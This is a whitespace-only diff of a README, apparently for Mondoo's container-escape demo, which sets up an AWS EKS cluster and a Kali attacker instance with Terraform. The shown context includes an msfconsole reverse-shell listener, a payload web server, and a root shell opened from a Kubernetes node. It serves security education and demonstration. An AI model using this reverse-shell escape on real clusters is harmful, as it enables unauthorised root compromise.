@@ -6,8 +6,7 @@ This folder contains Terraform automation code to provision the following:
 
 - **AWS VPC**
 - **AWS EKS Cluster** - 2 worker managed nodes (m5.medium)
-- **Kali Linux AWS EC2 Instance** - This instance is provisioned for the demonstration of the container-escape demo. The instance is provisioned with  
-
+- **Kali Linux AWS EC2 Instance** - This instance is provisioned for the demonstration of the container-escape demo. The instance is provisioned with
 
 <!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->
 
@@ -53,7 +52,7 @@ Before provisioning set the following environment variables:
 - `TF_VAR_ssh_key_path` - Path to to local ssh key for connecting to Kali Linux instance.
 - `TF_VAR_publicIP` - IP address of your home network to be applied to the security group for the Kali linux instance.
 
-### Example configuration 
+### Example configuration
 
 Open a terminal and run the following commands:
 
@@ -72,11 +71,13 @@ export TF_VAR_publicIP="73.231.132.25/32"
 ## Provision the cluster
 
 1. Clone the project
+
 ```bash title="Clone the project"
 git clone git@github.com:Lunalectric/container-escape.git
 ```
 
 2. cd into the terraform folder
+
 ```
 cd container-escape/aws
 ```
@@ -149,7 +150,7 @@ kali_linux_public_ip = <<EOT
 ################################################################################
 # KALI LINUX SSH:
 ################################################################################
-  
+
 ssh -o StrictHostKeyChecking=no -i $HOME/.ssh/id_rsa kali@18.117.77.75
 
 EOT
@@ -243,10 +244,10 @@ Containers:
       /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-4xdsp (ro)
 Conditions:
   Type              Status
-  Initialized       True 
-  Ready             True 
-  ContainersReady   True 
-  PodScheduled      True 
+  Initialized       True
+  Ready             True
+  ContainersReady   True
+  PodScheduled      True
 Volumes:
   kube-api-access-4xdsp:
     Type:                    Projected (a volume that contains injected data from multiple sources)
@@ -341,15 +342,15 @@ permitted by applicable law.
 ┃ ⇒ https://www.kali.org/docs/troubleshooting/common-cloud-setup/
 ┃
 ┗━(Run: “touch ~/.hushlogin” to hide this message)
-┌──(kali㉿kali)-[~] 
+┌──(kali㉿kali)-[~]
 ```
 
 Once you have ssh'd on to the host you will find a `/home/kali/container-escape` directory with the following files:
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ cd container-escape 
-                                                                                                                                       
+└─$ cd container-escape
+
 ┌──(kali㉿kali)-[~/container-escape]
 └─$ ls -la
 total 2196
@@ -385,10 +386,10 @@ In the second terminal, start `msfconsole` listening on port `4243` for the host
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ cd container-escape 
-                                                                                                                                       
+└─$ cd container-escape
+
 ┌──(kali㉿kali)-[~/container-escape]
-└─$ ./msfconsole2 
+└─$ ./msfconsole2
 [*] Using configured payload generic/shell_reverse_tcp
 payload => linux/x86/shell/reverse_tcp
 lhost => 0.0.0.0
@@ -402,10 +403,10 @@ In the third terminal, start webserver with Ruby:
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ cd container-escape 
-                                                                                                                                       
+└─$ cd container-escape
+
 ┌──(kali㉿kali)-[~/container-escape]
-└─$ ./start_ruby_webserver 
+└─$ ./start_ruby_webserver
 [2022-08-17 06:21:40] INFO  WEBrick 1.7.0
 [2022-08-17 06:21:40] INFO  ruby 3.0.4 (2022-04-12) [x86_64-linux-gnu]
 [2022-08-17 06:21:40] INFO  WEBrick::HTTPServer#start: pid=1104 port=8001
@@ -504,7 +505,7 @@ Now you got the reverse shell with root privileges from the kubernetes node, to 
 [*] Sending stage (36 bytes) to 18.218.68.47
 [*] Command shell session 1 opened (10.0.4.254:4243 -> 18.218.68.47:45802) at 2022-08-22 07:59:51 +0000
 
-id 
+id
 uid=0(root) gid=0(root) groups=0(root)
 hostname
 ip-10-0-6-19.us-east-2.compute.internal
@@ -812,7 +813,7 @@ terraform destroy -auto-approve
 
 ## License and Author
 
-* Author:: Mondoo Inc
+- Author:: Mondoo Inc
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
@@ -829,8 +830,3 @@ limitations under the License.
 ## Disclaimer
 
 This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that we (Mondoo Inc) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Mondoo Inc's responsibility.
-
-
-
-
-
